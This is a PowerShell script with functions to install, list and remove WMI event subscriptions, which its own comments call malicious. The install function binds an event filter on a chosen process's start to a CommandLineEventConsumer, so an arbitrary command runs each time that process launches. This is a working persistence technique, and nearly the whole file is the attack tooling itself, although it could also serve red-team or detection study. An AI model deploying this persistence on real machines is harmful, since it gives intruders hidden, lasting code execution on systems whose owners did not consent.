function Get-WMIPersistence {

<#
.SYNOPSIS
Gets the malicious WMI Event.

.PARAMETER EventName
Indicates the name of the consumer and filter to set up.

.EXAMPLE
Get-WMIPersistence -EventName "EventName"
#>

    Param (
            
        [Parameter(Mandatory = $true)]
        [String]
        [ValidateNotNullOrEmpty()]
        $EventName
        
    )

    Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = '$EventName'"
    Write-Host "----------------------------------------------------------"
    Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = '$EventName'"
    Write-Host "----------------------------------------------------------"
    Get-WmiObject -Class __FilterToConsumerbinding -Namespace root\subscription -Filter "Consumer = ""CommandLineEventConsumer.name='$EventName'"""
 
}


function Install-WMIPersistence {

<#
.SYNOPSIS
Registers a malicious WMI Event using start process as trigger executing a script when it is done.

.PARAMETER EventName
Indicates the name of the consumer and filter to set up.

.PARAMETER ProcessName
Indicated the name of the process to monitor

.PARAMETER Command
Indicates the command to execute when the process starts

.EXAMPLE
Install-WMIPersistence -EventName "EventName" -ProcessName "ProcessName" -Command "CommandToExecute"
#>

    Param (
        
        [Parameter(Mandatory = $true)]
        [String]
        [ValidateNotNullOrEmpty()]
        $EventName,
        
        [Parameter(Mandatory = $true)]
        [String]
        [ValidateNotNullOrEmpty()]
        $ProcessName,

        [Parameter(Mandatory = $true)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Command
        
    )

    #-----------------------------------------------------

    $Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
        EventNamespace = 'root/CIMV2'
        #Name = 'Malicious Filter'
        Name = $EventName
        #Query = 'SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA "Win32_Process" AND TargetInstance.Name = "notepad.exe"'
        Query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='$ProcessName'"
        QueryLanguage = 'WQL'
    }

    $EventCheck = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = '$EventName'"
    if ($EventCheck -ne $null) {
        Write-Host "Event Filter $EventFilterName successfully written to host"
    }

    #$Command = 'powershell.exe'

    #-----------------------------------------------------


    $Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
        #Name = 'Malicious Consumer'
        Name = $EventName
        CommandLineTemplate = $Command
    }

    $ConsumerCheck = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = '$EventName'"
    if ($ConsumerCheck -ne $null) {
        Write-Host "Event Consumer $EventConsumerName successfully written to host"
    }

    #-----------------------------------------------------

    Set-WmiInstance -Name root\subscription -Class __FilterToConsumerBinding -Arguments @{
        Filter = $Filter
        Consumer = $Consumer
    }

    $BindingCheck = Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding -Filter "Filter = ""__eventfilter.name='$EventName'"""
    if ($BindingCheck -ne $null){
        Write-Host "Filter To Consumer Binding successfully written to host"
    }

}

function Remove-WMIPersistence {

<#
.SYNOPSIS
Deletes a malicious WMI Event.

.PARAMETER EventName
Indicates the name of the consumer and filter to set up.

.EXAMPLE
Remove-WMIPersistence -EventName "EventName"

#>

    Param (
                
        [Parameter(Mandatory = $true)]
        [String]
        [ValidateNotNullOrEmpty()]
        $EventName
        
    )

    $EventConsumerToRemove = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = '$EventName'"
    $EventFilterToRemove = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = '$Eventname'"
    $FilterConsumerBindingToRemove = Get-WmiObject -Class __FilterToConsumerbinding -Namespace root\subscription -Filter "Consumer = ""CommandLineEventConsumer.name='$EventName'"""

    if($FilterConsumerBindingToRemove ) {$FilterConsumerBindingToRemove | Remove-WmiObject}
    if($EventConsumerToRemove) { $EventConsumerToRemove | Remove-WmiObject}
    if($EventFilterToRemove) { $EventFilterToRemove | Remove-WmiObject}

}